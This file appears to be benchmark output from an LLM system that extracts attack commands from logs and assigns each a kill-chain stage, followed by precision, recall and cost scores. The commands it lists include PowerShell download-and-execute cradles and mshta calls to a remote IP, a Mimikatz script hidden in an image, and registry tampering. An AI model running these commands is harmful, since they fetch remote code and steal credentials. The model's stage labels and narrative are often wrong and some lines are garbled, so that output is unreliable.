@@ -1,0 +1,151 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \".\\47\\??.ps1\"",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\\\"\"",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "mshta.exe http://124.223.85.207:8082/T1218.005.hta",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "cmd.exe /C T1059.006.py",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"net group \"domain admins\" /domain\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest t1547.001 -TestNumbers 1\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "tasklist",
+        "stage": "Discovery"
+      },
+      {
+        "command": "systeminfo",
+        "stage": "Discovery"
+      },
+      {
+        "command": "net time \\127.0.0.1",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \".\\T1059.003_script.bat\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1119 \"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \".\\chromeRemoteServices.ps1\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \\\"application/json\\\"\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Copy-Item '.\\msxsl.exe' 'c:\\Windows\\Temp\\msxsl.exe';Invoke-AtomicTest T1220  -TestNumbers 1\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \".\\\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"reg add \"HKEY_LOCAL_MACHINE/software\remoteaccess\rapasswd\" /v \"RAPassword\" /t REG_DWORD /d 1 /f\". Wait.",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"reg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\" /v \"VerifierDlls\" /t REG_SZ /d \"1\" /f\"",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"reg delete \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\" /v \"VerifierDlls\", \"f\"",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST' -UseBasicParsing -ContentType \\\"application/json\\\"\"",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"poweron -nuke  -time 3600000\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Import-Module .\\Invoke-PSImage.ps1; Invoke-PSImage -Script .\\Invoke-Mimikatz.ps1 -Out .\\evil-kiwi.png -Image .\\995647.jpg\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "cmd.exe /C \"certutil.exe -decode a.txt b.txt\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST' -UseBasicParsing -ContentType \\\"application/json\\\"\"",
+        "stage": "Credential Access"
+      }
+    ],
+    "narrative": "The attackers initiated their campaign through multiple vectors, gaining initial access via unknown means, exploiting a vulnerable webpage (MSHTA), and running Python scripts. Following initial access, they conducted discovery operations to learn more about the target environment. Once inside, they escalated their privileges by creating new registry entries and modifying existing ones. To avoid detection, they evaded defensive measures by deleting temporary files and executing code within the Windows shell. Additionally, they collected sensitive data, established persistence via modifications to the Windows Registry, created laterally moving ports and tunnels, established communication channels, stole credentials, and gathered further sensitive information.",
+    "_parse_ok": false,
+    "_cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 86164,
+      "completion_tokens": 10897,
+      "total_tokens": 97061,
+      "wall_clock_s": 150.927,
+      "parse_retries": 2
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.44,
+      "recall": 0.6111111111111112,
+      "f1": 0.5116279069767442,
+      "tp": 11,
+      "fp": 14,
+      "fn": 7
+    },
+    "stage": {
+      "precision": 0.2,
+      "recall": 0.3333333333333333,
+      "f1": 0.25,
+      "tp": 5,
+      "fp": 20,
+      "fn": 10,
+      "recall_partial": 0.39285714285714285
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 86164,
+      "completion_tokens": 10897,
+      "total_tokens": 97061,
+      "wall_clock_s": 150.927,
+      "parse_retries": 2
+    }
+  },
+  "meta": {
+    "variant": "v4_triage",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true
+  }
+}
